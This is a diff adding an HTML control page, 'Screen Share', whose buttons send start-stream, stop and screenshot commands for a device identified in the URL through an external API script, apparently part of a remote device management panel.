@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screen Stream</title>
+    <script src="js/api.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #1a1a1a;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .screen-container {
+            background: #000;
+            width: 100%;
+            max-width: 400px;
+            height: 700px;
+            margin: 20px auto;
+            border-radius: 20px;
+            border: 3px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .controls {
+            text-align: center;
+            margin: 20px;
+        }
+
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            cursor: pointer;
+            border-radius: 4px;
+            margin: 5px;
+        }
+
+        button.danger {
+            background: #ff4444;
+            color: #fff;
+        }
+
+        .back {
+            color: #00ff00;
+            text-decoration: none;
+        }
+
+        #log {
+            background: #000;
+            padding: 10px;
+            height: 100px;
+            overflow-y: auto;
+            font-family: monospace;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <a href="index.html" class="back">← Back</a>
+    <h1>🖥️ Screen Share</h1>
+    <div class="screen-container" id="preview">
+        <span style="color:#666">Screen Preview</span>
+    </div>
+    <div class="controls">
+        <button onclick="cmd('screen_stream_start')">▶ START STREAM</button>
+        <button class="danger" onclick="cmd('screen_stop')">⏹ STOP</button>
+        <button onclick="cmd('screen_snap')">📸 SCREENSHOT</button>
+    </div>
+    <div id="log"></div>
+    <script>
+        const deviceId = getDeviceIdFromUrl();
+        async function cmd(action) {
+            log(`Sending: ${action}`);
+            const result = await sendCommand(deviceId, action);
+            log(`Result: ${JSON.stringify(result)}`);
+        }
+    </script>
+</body>
+
+</html>
